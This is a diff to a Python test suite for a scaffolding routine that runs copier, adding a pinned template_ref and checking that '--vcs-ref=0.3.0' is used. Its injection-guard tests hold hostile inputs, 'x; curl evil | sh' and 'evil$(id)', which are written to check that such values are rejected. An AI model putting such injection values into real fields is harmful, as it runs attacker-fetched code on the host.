@@ -15,6 +15,7 @@ def scaffold_msg():
         "repository_id": "repo-456",
         "user_id": "user-1",
         "template_repo": "/data/service-template",
+        "template_ref": "0.3.0",
         "project_name": "my-project",
         "modules": "backend,tg_bot",
         "task_description": "Build a bot that reverses strings",
@@ -54,6 +55,9 @@ class TestRunScaffold:
         async def fake_subprocess(*args, **kwargs):
             cmd = args[0] if args else kwargs.get("args", "")
             commands_run.append(cmd)
+            if "copier copy" in cmd:
+                workspace.mkdir(parents=True, exist_ok=True)
+                (workspace / ".copier-answers.yml").write_text("_commit: 27c76cef\n")
             if "tree" in cmd:
                 return tree_process
             return mock_process
@@ -63,6 +67,7 @@ class TestRunScaffold:
                 project_id=scaffold_msg["project_id"],
                 repository_id=scaffold_msg["repository_id"],
                 template_repo=scaffold_msg["template_repo"],
+                template_ref=scaffold_msg["template_ref"],
                 project_name=scaffold_msg["project_name"],
                 modules=scaffold_msg["modules"],
                 task_description=scaffold_msg["task_description"],
@@ -80,6 +85,8 @@ class TestRunScaffold:
         cmd_str = " ".join(commands_run)
         assert "copier copy" in cmd_str
         assert "--trust" not in cmd_str
+        assert "--vcs-ref=0.3.0" in cmd_str
+        assert "--vcs-ref=HEAD" not in cmd_str
         assert "make setup" in cmd_str
         assert "git push" in cmd_str
 
@@ -99,6 +106,7 @@ class TestRunScaffold:
                 project_id=scaffold_msg["project_id"],
                 repository_id=scaffold_msg["repository_id"],
                 template_repo=scaffold_msg["template_repo"],
+                template_ref=scaffold_msg["template_ref"],
                 project_name=scaffold_msg["project_name"],
                 modules=scaffold_msg["modules"],
                 task_description=scaffold_msg["task_description"],
@@ -123,6 +131,7 @@ class TestRunScaffold:
                 project_id=scaffold_msg["project_id"],
                 repository_id=scaffold_msg["repository_id"],
                 template_repo=scaffold_msg["template_repo"],
+                template_ref=scaffold_msg["template_ref"],
                 project_name=scaffold_msg["project_name"],
                 modules=scaffold_msg["modules"],
                 task_description=scaffold_msg["task_description"],
@@ -147,6 +156,7 @@ class TestScaffoldInjectionGuard:
                 project_id=scaffold_msg["project_id"],
                 repository_id=scaffold_msg["repository_id"],
                 template_repo=scaffold_msg["template_repo"],
+                template_ref=scaffold_msg["template_ref"],
                 project_name=scaffold_msg["project_name"],
                 modules="x; curl evil | sh",
                 task_description=scaffold_msg["task_description"],
@@ -170,6 +180,7 @@ class TestScaffoldInjectionGuard:
                 project_id=scaffold_msg["project_id"],
                 repository_id=scaffold_msg["repository_id"],
                 template_repo=scaffold_msg["template_repo"],
+                template_ref=scaffold_msg["template_ref"],
                 project_name="evil$(id)",
                 modules=scaffold_msg["modules"],
                 task_description=scaffold_msg["task_description"],
